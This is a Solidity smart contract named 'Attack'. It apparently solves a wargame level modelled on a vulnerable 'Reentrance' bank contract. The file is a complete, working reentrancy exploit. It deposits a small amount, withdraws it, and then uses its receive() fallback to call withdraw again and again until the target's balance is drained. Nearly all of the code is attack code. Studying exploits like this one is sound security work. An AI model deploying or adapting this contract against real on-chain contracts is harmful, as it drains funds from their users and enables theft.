// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.6.12;

import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";

interface IReentrancy {
    function donate(address) external payable;

    function withdraw(uint) external;
}

contract Attack {
    IReentrancy private immutable bank;

    constructor(address payable _bankAddress) public {
        bank = IReentrancy(_bankAddress);
    }

    // Fallback is called when Reentrance sends Ether to this contract.
    receive() external payable {
        if (address(bank).balance >= 0.001 ether) {
            bank.withdraw(0.001 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 0.001 ether);
        bank.donate{value: 0.001 ether}(address(this));
        bank.withdraw(0.001 ether);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
